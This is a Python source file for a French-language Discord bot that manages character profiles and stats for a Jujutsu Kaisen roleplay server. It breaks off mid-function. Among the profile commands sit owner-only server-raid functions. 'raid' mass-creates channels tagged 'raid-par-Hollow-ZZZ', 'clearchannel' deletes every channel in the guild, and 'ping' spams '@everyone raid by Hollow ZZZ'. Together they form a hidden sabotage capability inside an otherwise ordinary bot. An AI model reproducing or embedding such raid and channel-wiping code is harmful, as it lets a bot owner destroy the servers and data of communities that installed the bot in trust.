
import asyncio
import discord # type: ignore
from discord.ext import commands # type: ignore
from discord import app_commands # type: ignore
import json
import os
import re
import time
from discord.ui import View, Button, Select # type: ignore
from discord import SelectOption # type: ignore

def arabic_to_roman(num):
    if num <= 0:
        return str(num)
    roman_numerals = [
        (1000, 'M'), (900, 'CM'), (500, 'D'), (400, 'CD'),
        (100, 'C'), (90, 'XC'), (50, 'L'), (40, 'XL'),
        (10, 'X'), (9, 'IX'), (5, 'V'), (4, 'IV'), (1, 'I')
    ]
    result = ''
    for value, symbol in roman_numerals:
        while num >= value:
            result += symbol
            num -= value
    return result

def roman_to_arabic(s):
    roman = {'I':1, 'V':5, 'X':10, 'L':50, 'C':100, 'D':500, 'M':1000}
    total = 0
    prev = 0
    for char in reversed(s.upper()):
        val = roman.get(char, 0)
        if val < prev:
            total -= val
        else:
            total += val
        prev = val
    return total

def to_math_bold(text):
    sans_serif_bold_upper = {chr(ord('A') + i): chr(0x1D5D4 + i) for i in range(26)}
    sans_serif_bold_lower = {chr(ord('a') + i): chr(0x1D5EE + i) for i in range(26)}
    return ''.join(sans_serif_bold_upper.get(c, sans_serif_bold_lower.get(c, c)) for c in text)




bot = commands.Bot(command_prefix='+', help_command=None, intents=discord.Intents.all())

async def load_cogs():
    await bot.load_extension("cogs.setprofil")

@bot.event
async def on_ready():
    print("Le bot est pret zinc")
    try:
        await bot.tree.sync()
        print("Slash commands synced successfully globally")
    except Exception as e:
        print(f"Failed to sync slash commands: {e}")
    # Ping the role in the specified channel when the bot is online
    channel = bot.get_channel(1435673750225027102)
    if channel:
        await channel.send(f"<@&{1432807766606745643}> Bot en ligne!")


@bot.command()
@commands.is_owner()
@commands.has_permissions(kick_members=True, ban_members=True, manage_roles=True) # Setting permissions that a user should have to execute this command.
async def ban(ctx, member: discord.Member, *, reason=None):
    if member == ctx.author:
        await ctx.send("Tu ne peux pas te bannir toi-même.")
        return
    if member.top_role >= ctx.guild.me.top_role:
        await ctx.send("Je ne peux pas bannir cet utilisateur car il a un rôle plus élevé ou égal au mien.")
        return
    if member == ctx.guild.owner:
        await ctx.send("Je ne peux pas bannir le propriétaire du serveur.")
        return
    try:
        if reason is None:
            reason = "Not Specified"
        await member.send(f'Salut {member.name}! Tu as été ban de, {ctx.channel.guild.name}. Tu as vraiment du faire quelque chose de mal. VRAIMENT MAL ! :angry: :triumph: \n \nRaison: {reason}')
        await member.ban(reason=reason)
        await ctx.channel.send(f'Salut {ctx.author.name}! {member.name} a bien été ban de ce serveur!\n \nReason: {reason}')
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions pour bannir cet utilisateur.")
    except Exception as e:
        await ctx.send(f"Erreur lors du bannissement: {e}")

@bot.command()
@commands.is_owner()
@commands.has_permissions(kick_members=True, ban_members=True, manage_roles=True)
async def unban(ctx, user_id: int, *, reason=None):
    try:
        user = await bot.fetch_user(user_id)
        if user == ctx.author:
            await ctx.send("Tu ne peux pas te débannir toi-même.")
            return
        if reason is None:
            reason = "Not Specified"
        await ctx.guild.unban(discord.Object(id=user_id), reason=reason)
        await ctx.channel.send(f'Salut {ctx.author.name}! {user.name}#{user.discriminator} a bien été débanni de ce serveur!\n \nReason: {reason}')
    except discord.NotFound:
        await ctx.send("Utilisateur introuvable ou pas banni.")
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions pour débannir cet utilisateur.")
    except Exception as e:
        await ctx.send(f"Erreur lors du débannissement: {e}")

@bot.command()
@commands.is_owner()
async def Clear(ctx, number):
    try:
        number = int(number)
    except ValueError:
        await ctx.send("Veuillez fournir un nombre valide.")
        return
    deleted = await ctx.channel.purge(limit=number)
    await ctx.send(f"Supprimé {len(deleted)} messages.", delete_after=5)


@bot.command()
@commands.is_owner()
async def raid(ctx):
    guild = ctx.message.guild
    for i in range(1, 10):
        await guild.create_text_channel(name='raid-par-Hollow-ZZZ') # crée une multide de channels (nombre fournie)
        i = i+1



@bot.command()
@commands.is_owner()
async def shutdown(ctx):
   await ctx.send("Shutting down bot!")
   await bot.close()

@bot.command()
@commands.is_owner()
async def clearchannel(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()

@bot.command()
@commands.is_owner()
async def ping(ctx):
    guild = ctx.message.guild
    await ctx.send("@everyone raid by Hollow ZZZ")

@bot.command()
@commands.is_owner()
async def embedimage(ctx):
    embed = discord.Embed()
    embed.set_image(url="https://media.discordapp.net/attachments/1432807843282813049/1435329239061893130/profile.gif?ex=690b9205&is=690a4085&hm=c07b5468f357fd03f499d37a4126a49d0bb94e9a5b29716f0e49402b90bc71fc&=&width=1521&height=856")
    await ctx.send(embed=embed)


@bot.command()
@commands.is_owner()
async def embed1(ctx):
        embed = discord.Embed(title="```Disponibilités JJK Resurection```", color=0x000000)
        embed.description = """︲๑︲⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯ ▻ :

       """
        
        embed.set_image(url="https://images-ext-1.discordapp.net/external/1okGTD_swLJLu9E2EPSuM5QVl-lftPPYosiE9bqluAg/https/i.pinimg.com/1200x/d0/be/78/d0be78603bca32d7999808830cefd677.jpg?format=webp")
        await ctx.send(embed=embed)




@bot.command()
@commands.is_owner()
async def embed2(ctx):
        embed = discord.Embed(title="𑁋 **`Clans JJK Resurection`**", color=0x000000)
        embed.description = """︲๑︲⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯ ▻ :

"""









@bot.command()
@commands.is_owner()
async def gurren_lagann(ctx):
    # Send the MP4 file
    await ctx.send(file=discord.File("D:\Projets Divers\BOT HOLLOW ZZZ\gurren_lagann.mp4"))

    # Messages with timings in seconds from file send
    messages = [
        (1, "We evolve!"),
        (2, "Behind the person we were a minute before!"),
        (6, "Little by little!"),
        (9, "We advance of the further with each TURN!"),
        (12, "That's how a drill works!"),
        (15, "Gurenn Lagann, SPIN ON!"),
        (17, "Who the hell do you think I am?"),
        (21, "Just WHO, IN THE HELL DO YOU THINK WE ARE!!!!"),
        (27, "*outro music*")
    ]

    current_time = 0
    for time, message in messages:
        delay = time - current_time
        if delay > 0:
            await asyncio.sleep(delay)
        await ctx.send(message)
        current_time = time
















def load_profiles():
    if os.path.exists('profiles.json'):
        with open('profiles.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_profiles(profiles):
    with open('profiles.json', 'w', encoding='utf-8') as f:
        json.dump(profiles, f, indent=4)

def load_previous_top():
    if os.path.exists('previous_top.json'):
        with open('previous_top.json', 'r') as f:
            return json.load(f)
    return {}

def save_previous_top(data):
    with open('previous_top.json', 'w') as f:
        json.dump(data, f, indent=4)

class ProfileView(View):
    def __init__(self, user_id, profiles, original_name, profile_user_id=None):
        super().__init__(timeout=300)
        self.user_id = user_id
        self.profiles = profiles
        self.page = 0
        self.sub_page = 0  # 0 for stats, 1 for techniques
        self.original_name = original_name
        self.profile_user_id = profile_user_id or user_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == int(self.user_id)

    async def update_embed(self, interaction):
        self.profiles = load_profiles()
        profile = self.profiles.get(str(self.profile_user_id), {})
        embed = discord.Embed(title=f"<:red_star:1433227113066004602> • {self.original_name}", color=0x000000)

        def style_text(text):
            if text == 'Non défini':
                return text
            return to_math_bold(text)

        if self.page == 0:
            nom = style_text(profile.get('name', 'Non défini'))
            prenom = style_text(profile.get('surname', 'Non défini'))
            age = profile.get('age', 'Non défini')
            camps = style_text(profile.get('camps', 'Non défini'))
            sort_inne = style_text(profile.get('sort_inne', 'Non défini'))
            embed.description = f"\n\n<:fleche2:1433065216115216487> 𝐍𝗈𝗆 : {nom}\n\n<:fleche2:1433065216115216487> 𝐏𝗋𝖾𝗇𝗈𝗆 : {prenom}\n\n<:fleche2:1433065216115216487> 𝐀𝗀𝖾 : {age}\n\n<:fleche2:1433065216115216487> 𝐂𝖺𝗆𝗉𝗌 : {camps}\n\n<:fleche2:1433065216115216487> 𝐒𝗈𝗋𝗍 𝐈𝗇𝗇𝖾𝖾 : {sort_inne}"
            if profile.get('image'):
                embed.set_image(url=profile['image'])
        elif self.page == 1:
            if self.sub_page == 0:
                vitesse = arabic_to_roman(int(profile.get('vitesse', '0')))
                prestige_vitesse = arabic_to_roman(int(profile.get('prestige_vitesse', '0')))
                combat = arabic_to_roman(int(profile.get('combat', '0')))
                prestige_combat = arabic_to_roman(int(profile.get('prestige_combat', '0')))
                endurance = arabic_to_roman(int(profile.get('endurance', '0')))
                prestige_endurance = arabic_to_roman(int(profile.get('prestige_endurance', '0')))
                defense = arabic_to_roman(int(profile.get('defense', '0')))
                prestige_defense = arabic_to_roman(int(profile.get('prestige_defense', '0')))
                force = arabic_to_roman(int(profile.get('force', '0')))
                prestige_force = arabic_to_roman(int(profile.get('prestige_force', '0')))
                embed.description = f"💨 **𝐕𝗂𝗍𝖾𝗌𝗌𝖾:** {vitesse}\n<:ligne:1432836349261516902> 𝐏𝗋𝖾𝗌𝗍𝗂𝗀𝖾: {prestige_vitesse}\n\n⚔️ **𝐂𝗈𝗆𝖻𝖺𝗍:** {combat}\n<:ligne:1432836349261516902> 𝐏𝗋𝖾𝗌𝗍𝗂𝗀𝖾: {prestige_combat}\n\n🏋️ **𝐄𝗇𝖽𝗎𝗋𝖺𝗇𝖼𝖾:** {endurance}\n<:ligne:1432836349261516902> 𝐏𝗋𝖾𝗌𝗍𝗂𝗀𝖾: {prestige_endurance}\n\n🛡️ **Défense:** {defense}\n<:ligne:1432836349261516902> 𝐏𝗋𝖾𝗌𝗍𝗂𝗀𝖾: {prestige_defense}\n\n💪 **𝐅𝗈𝗋𝖼𝖾:** {force}\n<:ligne:1432836349261516902> 𝐏𝗋𝖾𝗌𝗍𝗂𝗀𝖾: {prestige_force}"
            elif self.sub_page == 1:
                rct = profile.get('rct', 'Non défini')
                prestige_rct = arabic_to_roman(int(profile.get('prestige_rct', '0')))
                rayon_noir = profile.get('rayon_noir', 'Non défini')
                prestige_rayon_noir = arabic_to_roman(int(profile.get('prestige_rayon_noir', '0')))
                territoire_simple = profile.get('territoire_simple', 'Non défini')
                prestige_territoire_simple = arabic_to_roman(int(profile.get('prestige_territoire_simple', '0')))
                embed.description = f"🔄 **𝐑𝐂𝐓:** {rct}\n<:ligne:1432836349261516902>𝐒𝗍𝖺𝖽𝖾: {prestige_rct}\n\n⚫ **𝐑𝖺𝗒𝗈𝗇 𝐍𝗈𝗂𝗋:** {rayon_noir}\n<:ligne:1432836349261516902>𝐒𝗍𝖺𝖽𝖾: {prestige_rayon_noir}\n\n🗺️ **𝐓𝖾𝗋𝗋𝗂𝗍𝗈𝗂𝗋𝖾 𝐒𝗂𝗆𝗉𝗅𝖾:** {territoire_simple}\n<:ligne:1432836349261516902>𝐒𝗍𝖺𝖽𝖾: {prestige_territoire_simple}"
            elif self.sub_page == 2:
                energie_occulte = arabic_to_roman(int(profile.get('energie_occulte', '0')))
                extension_territoire = profile.get('extension_territoire', 'Non défini')
                prestige_extension_territoire = arabic_to_roman(int(profile.get('prestige_extension_territoire', '0')))
                embed.description = f"<:fleche2:1433065216115216487> 𝐏𝗈𝗂𝗇𝗍𝗌 𝐃𝖾 𝐉𝗎𝗃𝗎𝗍𝗌𝗎: {energie_occulte}\n\n<:fleche2:1433065216115216487> 𝐄𝗑𝗍𝖾𝗇𝗌𝗂𝗈𝗇 𝐃𝗎 𝐓𝖾𝗋𝗋𝗂𝗍𝗈𝗂𝗋𝖾: {extension_territoire}\n<:ligne:1432836349261516902>𝐒𝗍𝖺𝖽𝖾: {prestige_extension_territoire}"
        elif self.page == 2:
            sort_inne = style_text(profile.get('sort_inne', 'Non défini'))
            notes_personnelles = style_text(profile.get('notes_personnelles', 'Non défini'))
            embed.description = f"🧙‍♂️ **Sort Innée:** {sort_inne}\n\n<:fleche2:1433065216115216487> **Notes Personnelles:** {notes_personnelles}"

        # Clear and rebuild view
        self.clear_items()
        self.add_item(self.id_card)
        self.add_item(self.stats)
        self.add_item(self.sort_inne)
        if self.page == 1:
            select = Select(placeholder="Choisir une catégorie", options=[
                SelectOption(label="Stats", value="stats", default=self.sub_page == 0),
                SelectOption(label="Techniques", value="techniques", default=self.sub_page == 1),
                SelectOption(label="Amplification", value="amplification", default=self.sub_page == 2)
            ])
            select.callback = self.select_callback
            self.add_item(select)

        await interaction.response.edit_message(embed=embed, view=self)

    async def select_callback(self, interaction: discord.Interaction):
        value = interaction.data['values'][0]
        if value == "stats":
            self.sub_page = 0
        elif value == "techniques":
            self.sub_page = 1
        elif value == "amplification":
            self.sub_page = 2
        await self.update_embed(interaction)

    @discord.ui.button(label="𝐈𝐃 𝐂𝐚𝐫𝐝", emoji="🆔", style=discord.ButtonStyle.primary)
    async def id_card(self, interaction: discord.Interaction, button: Button):
        self.page = 0
        await self.update_embed(interaction)

    @discord.ui.button(label="𝐒𝐭𝐚𝐭𝐬", emoji="📊", style=discord.ButtonStyle.primary)
    async def stats(self, interaction: discord.Interaction, button: Button):
        self.page = 1
        self.sub_page = 0  # Default to stats
        await self.update_embed(interaction)

    @discord.ui.button(label="𝐒𝐨𝐫𝐭 𝐈𝐧𝐧é𝐞", emoji="🧙‍♂️", style=discord.ButtonStyle.primary)
    async def sort_inne(self, interaction: discord.Interaction, button: Button):
        self.page = 2
        await self.update_embed(interaction)

@bot.command()
@commands.has_role(1432807766606745643)
async def helpprofil(ctx):
    help_msg = (
        "**Créer un profil : +setprofil**\n\n"
        "**Syntaxe :**\n"
        "/setprofil 'nom' 'prénom' 'âge' 'camps' 'sort_innée' 'force' 'défense' 'combat' 'énergie_occulte' 'vitesse' 'endurance'\n"
        "(Pour admins : +setprofil @user nom prénom âge camps sort_innée force défense combat énergie_occulte vitesse endurance)\n\n"
        "**Paramètres :**\n"
        "- nom : Nom du personnage (ex: Gojo)\n"
        "- prénom : Prénom (ex: Satoru)\n"
        "- âge : Nombre (ex: 28)\n"
        "- camps : Exorciste ou Fléau\n"
        "- sort_innée : Technique spéciale (ex: Infini)\n"
        "- Ordre des stats : \n"
        "- force : Puissance physique (1-10)\n"
        "- défense : Résistance (1-10)\n"
        "- combat : Maîtrise du combat (1-10)\n"
        "- énergie_occulte : Quantité d'énergie (1-10)\n"
        "- vitesse : Rapidité (1-10)\n"
        "- endurance : Endurance physique (1-10)\n\n"
        "**Règles :**\n"
        "- Attachez une image (PNG/JPG/JPEG/GIF/BMP/WEBP) au message.\n"
        "- Techniques avancées (RCT, Rayon Noir, etc.) démarrent à 0.\n"
        "- Stats affichées en romain ; Prestige/Stade ajoutés par admins.\n"
        "- Admins peuvent définir des profils pour d'autres utilisateurs en mentionnant @user en premier.\n\n"
        "**Exemple :**\n"
        "/setprofil Gojo Satoru 28 Exorciste Infini 10 8 9 7 6 5 (votre notes personnelles)\n"
        "(Image ou gif obligatoire !)"
    )
    await ctx.send(help_msg)

@bot.tree.command(name="setprofil", description="Créer ou mettre à jour un profil de personnage.")
@app_commands.describe(
    nom="Nom du personnage (ex: Gojo)",
    prenom="Prénom du personnage (ex: Satoru)",
    age="Âge du personnage (ex: 16)",
    camps="Exorcist,Fléau, Mdf ou Chasseur",
    sort_innee="Sort inné (ex: Infini)",
    force="Stat de 1 à 10",
    defense="Stat de 1 à 10",
    combat="Stat de 1 à 10",
    energie_occulte="Stat de 1 à 10",
    vitesse="Stat de 1 à 10",
    endurance="Stat de 1 à 10",
    notes_personnelles="Notes personnelles",
    image="Image du personnage (obligatoire gif ou image)"

)
async def slash_setprofil(
    ctx: discord.Interaction,
    nom: str,
    prenom: str,
    age: str,
    camps: str,
    sort_innee: str,
    force: str,
    defense: str,
    combat: str,
    energie_occulte: str,
    vitesse: str,
    endurance: str,
    notes_personnelles: str,
    image: discord.Attachment
):
    if ctx.user.id == 1432807771052576880:
        await ctx.response.send_message("Pour effectuer cette commande il faut que tu sois validé. Va faire ta fiche pour y avoir accès !")
        return
    role = ctx.guild.get_role(1432807766606745643)
    admin_role = ctx.guild.get_role(1432807516731080797)
    is_admin = admin_role in ctx.user.roles
    if role not in ctx.user.roles and not is_admin:
        await ctx.response.send_message("Vous n'avez pas le rôle requis.")
        return
    target_user = ctx.user

    # Validate age
    if not age.isdigit():
        await ctx.response.send_message("Erreur: L'âge doit être un nombre.")
        return

    # Validate stats
    stats = [force, defense, combat, energie_occulte, vitesse, endurance]
    stat_names = ['force', 'défense', 'combat', 'énergie occulte', 'vitesse', 'endurance']
    for stat, stat_name in zip(stats, stat_names):
        if not stat.isdigit():
            await ctx.response.send_message(f"Erreur: {stat_name} doit être un nombre.")
            return

    profiles = load_profiles()
    user_id = str(target_user.id)
    allowed_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp']
    if not any(image.filename.lower().endswith(ext) for ext in allowed_extensions):
        await ctx.response.send_message("Erreur: L'image doit être au format PNG, JPG, JPEG, GIF, BMP ou WEBP.")
        return
    try:
        name = nom.replace('_', ' ')
        surname = prenom.replace('_', ' ')
        age = age.replace('_', ' ')
        camps = camps.replace('_', ' ')
        sort_inne = sort_innee.replace('_', ' ')
        force = force.replace('_', ' ')
        defense = defense.replace('_', ' ')
        combat = combat.replace('_', ' ')
        energie_occulte = energie_occulte.replace('_', ' ')
        vitesse = vitesse.replace('_', ' ')
        endurance = endurance.replace('_', ' ')
        # Techniques are automatically set to '0' for new players
        rct = '0'
        rayon_noir = '0'
        extension_territoire = '0'
        territoire_simple = '0'
        profiles[user_id] = {
            'name': name,
            'surname': surname,
            'age': age,
            'camps': camps,
            'sort_inne': sort_inne,
            'force': force,
            'defense': defense,
            'combat': combat,
            'energie_occulte': energie_occulte,
            'vitesse': vitesse,
            'endurance': endurance,
            'prestige_force': '0',
            'prestige_defense': '0',
            'prestige_combat': '0',
            'prestige_energie_occulte': '0',
            'prestige_vitesse': '0',
            'prestige_endurance': '0',
            'rct': rct,
            'rayon_noir': rayon_noir,
            'extension_territoire': extension_territoire,
            'territoire_simple': territoire_simple,
            'prestige_rct': '0',
            'prestige_sort_inversion': '0',
            'prestige_extension_territoire': '0',
            'prestige_rayon_noir': '0',
            'prestige_territoire_simple': '0',
            'prestige_stade_rayon_noir': '0',
            'notes_personnelles': notes_personnelles,
            'image': image.proxy_url
        }
        save_profiles(profiles)
        await ctx.response.send_message("Profil mis à jour avec succès!")
    except Exception as e:
        await ctx.response.send_message(f"Erreur lors de la création du profil: {str(e)}")

@bot.command()
async def setprofil(ctx, *args):
    if ctx.author.id == 1432807771052576880:
        await ctx.send("Pour effectuer cette commande il faut que tu sois validé. Va faire ta fiche pour y avoir accès !")
        return
    role = ctx.guild.get_role(1432807766606745643)
    admin_role = ctx.guild.get_role(1432807516731080797)
    is_admin = admin_role in ctx.author.roles
    target_user = ctx.author
    if is_admin and args and args[0].startswith('<@') and args[0].endswith('>'):
        try:
            target_user_id = int(args[0][2:-1])
            target_user = ctx.guild.get_member(target_user_id)
            if not target_user:
                await ctx.send("Utilisateur mentionné introuvable.")
                return
            args = args[1:]
        except ValueError:
            pass
    elif not is_admin and role not in ctx.author.roles:
        await ctx.send("Vous n'avez pas le rôle requis.")
        return
    elif is_admin and role not in ctx.author.roles:
        # Admins can set profiles even without the regular role
        pass

    if len(args) != 11:
        await ctx.send("Erreur: Nombre d'arguments incorrect. (Utilisez +helpprofil pour voir l'utilisation.)")
        return
    name, surname, age, camps, sort_inne, force, defense, combat, energie_occulte, vitesse, endurance = args

    # Validate age
    if not age.isdigit():
        await ctx.send("Erreur: L'âge doit être un nombre.")
        return

    # Validate stats
    stats = [force, defense, combat, energie_occulte, vitesse, endurance]
    stat_names = ['force', 'défense', 'combat', 'énergie occulte', 'vitesse', 'endurance']
    for stat, stat_name in zip(stats, stat_names):
        if not stat.isdigit():
            await ctx.send(f"Erreur: {stat_name} doit être un nombre.")
            return

    profiles = load_profiles()
    user_id = str(target_user.id)
    if not ctx.message.attachments:
        await ctx.send("Erreur: Veuillez attacher une image (PNG, JPG, JPEG, GIF, BMP ou WEBP).")
        return
    attachment = ctx.message.attachments[0]
    allowed_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp']
    if not any(attachment.filename.lower().endswith(ext) for ext in allowed_extensions):
        await ctx.send("Erreur: L'image doit être au format PNG, JPG, JPEG, GIF, BMP ou WEBP.")
        return
    image_url = attachment.proxy_url
    try:
        name = name.replace('_', ' ')
        surname = surname.replace('_', ' ')
        age = age.replace('_', ' ')
        camps = camps.replace('_', ' ')
        sort_inne = sort_inne.replace('_', ' ')
        force = force.replace('_', ' ')
        defense = defense.replace('_', ' ')
        combat = combat.replace('_', ' ')
        energie_occulte = energie_occulte.replace('_', ' ')
        vitesse = vitesse.replace('_', ' ')
        endurance = endurance.replace('_', ' ')
        # Techniques are automatically set to '0' for new players
        rct = '0'
        rayon_noir = '0'
        extension_territoire = '0'
        territoire_simple = '0'
        profiles[user_id] = {
            'name': name,
            'surname': surname,
            'age': age,
            'camps': camps,
            'sort_inne': sort_inne,
            'force': force,
            'defense': defense,
            'combat': combat,
            'energie_occulte': energie_occulte,
            'vitesse': vitesse,
            'endurance': endurance,
            'prestige_force': '0',
            'prestige_defense': '0',
            'prestige_combat': '0',
            'prestige_energie_occulte': '0',
            'prestige_vitesse': '0',
            'prestige_endurance': '0',
            'rct': rct,
            'rayon_noir': rayon_noir,
            'extension_territoire': extension_territoire,
            'territoire_simple': territoire_simple,
            'prestige_rct': '0',
            'prestige_sort_inversion': '0',
            'prestige_extension_territoire': '0',
            'prestige_rayon_noir': '0',
            'prestige_territoire_simple': '0',
            'prestige_stade_rayon_noir': '0',
            'notes_personnelles': 'Non défini',
            'image': image_url
        }
        save_profiles(profiles)
        await ctx.send("Profil mis à jour avec succès!")
    except Exception as e:
        await ctx.send(f"Erreur lors de la création du profil: {str(e)}")

@bot.command()
@commands.has_role(1432807766606745643)
async def profil(ctx):
    member = ctx.author
    profiles = load_profiles()
    user_id = str(member.id)
    if user_id not in profiles:
        await ctx.send(f"Pour effectuer cette commande il faut que tu sois validé. Va faire ta fiche pour y avoir accès ! Si tu l'es déjà, essayes +helpprofil! {member.mention}")
        return
    view = ProfileView(ctx.author.id, profiles, member.display_name)
    embed = discord.Embed(title=f" <:red_star:1433227113066004602> • Profil de {member.display_name}\n ", color=0x000000)
    profile = profiles[user_id]

    def style_text(text):
        if text == 'Non défini':
            return text
        return to_math_bold(text)

    nom = style_text(profile.get('name', 'Non défini'))
    prenom = style_text(profile.get('surname', 'Non défini'))
    age = profile.get('age', 'Non défini')
    camps = style_text(profile.get('camps', 'Non défini'))
    sort_inne = style_text(profile.get('sort_inne', 'Non défini'))
    notes_personnelles = style_text(profile.get('notes_personnelles', 'Non défini'))
    embed.description = f"<:fleche2:1433065216115216487> 𝐍𝗈𝗆 : {nom}\n\n<:fleche2:1433065216115216487> 𝐏𝗋𝖾𝗇𝗈𝗆 : {prenom}\n\n<:fleche2:1433065216115216487> 𝐀𝗀𝖾 : {age}\n\n<:fleche2:1433065216115216487> 𝐂𝖺𝗆𝗉𝗌 : {camps}\n\n<:fleche2:1433065216115216487> 𝐒𝗈𝗋𝗍 𝐈𝗇𝗇𝖾𝖾 : {sort_inne}"
    if profile.get('image'):
        embed.set_image(url=profile['image'])
    await ctx.send(embed=embed, view=view)

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
@commands.has_role(1432807766606745643)
async def profil_show(ctx, member: discord.Member):
    profiles = load_profiles()
    user_id = str(member.id)
    if user_id not in profiles:
        await ctx.send(f"{member.display_name} n'a pas de profil défini.")
        return
    view = ProfileView(ctx.author.id, profiles, member.display_name, member.id)
    embed = discord.Embed(title=f"<:red_star:1433227113066004602> • Profil de {member.display_name}", color=0x000000)
    profile = profiles[user_id]

    def style_text(text):
        if text == 'Non défini':
            return text
        return to_math_bold(text)

    nom = style_text(profile.get('name', 'Non défini'))
    prenom = style_text(profile.get('surname', 'Non défini'))
    age = profile.get('age', 'Non défini')
    camps = style_text(profile.get('camps', 'Non défini'))
    sort_inne = style_text(profile.get('sort_inne', 'Non défini'))
    embed.description = f"<:fleche2:1433065216115216487> 𝐍𝗈𝗆 : {nom}\n\n<:fleche2:1433065216115216487> 𝐏𝗋𝖾𝗇𝗈𝗆 : {prenom}\n\n<:fleche2:1433065216115216487> 𝐀𝗀𝖾 : {age}\n\n<:fleche2:1433065216115216487> 𝐂𝖺𝗆𝗉𝗌 : {camps}\n\n<:fleche2:1433065216115216487> 𝐒𝗈𝗋𝗍 𝐈𝗇𝗇𝖾𝖾 : {sort_inne}"
    if profile.get('image'):
        embed.set_image(url=profile['image'])
    await ctx.send(embed=embed, view=view)

@bot.command()
@commands.has_role(1432807516731080797)
async def resetprofil(ctx, user_id: str):
    profiles = load_profiles()
    if user_id in profiles:
        del profiles[user_id]
        save_profiles(profiles)
        await ctx.send(f"Profil de l'utilisateur {user_id} a été réinitialisé.")
    else:
        await ctx.send(f"Aucun profil trouvé pour l'utilisateur {user_id}.")

@bot.command(name='add-force')
@commands.has_role(1432807516731080797)
async def add_force(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('force', '0'))
    new_value = current + value
    profiles[user_id]['force'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Force de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-defense')
@commands.has_role(1432807516731080797)
async def add_defense(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('defense', '0'))
    new_value = current + value
    profiles[user_id]['defense'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Défense de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-combat')
@commands.has_role(1432807516731080797)
async def add_combat(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('combat', '0'))
    new_value = current + value
    profiles[user_id]['combat'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Combat de {target_user.mention} augmenté de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-energie_occulte')
@commands.has_role(1432807516731080797)
async def add_energie_occulte(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('energie_occulte', '0'))
    new_value = current + value
    profiles[user_id]['energie_occulte'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Énergie Occulte de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-vitesse')
@commands.has_role(1432807516731080797)
async def add_vitesse(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('vitesse', '0'))
    new_value = current + value
    profiles[user_id]['vitesse'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Vitesse de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-endurance')
@commands.has_role(1432807516731080797)
async def add_endurance(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('endurance', '0'))
    new_value = current + value
    profiles[user_id]['endurance'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Endurance de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='add-rct')
@commands.has_role(1432807516731080797)
async def add_rct(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('rct', '0'))
    new_value = current + value
    profiles[user_id]['rct'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"RCT de {target_user.mention} augmenté de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='add-extension')
@commands.has_role(1432807516731080797)
async def add_extension(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('extension_territoire', '0'))
    new_value = current + value
    profiles[user_id]['extension_territoire'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Extension du Territoire de {target_user.mention} augmentée de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='add-territoire')
@commands.has_role(1432807516731080797)
async def add_territoire(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
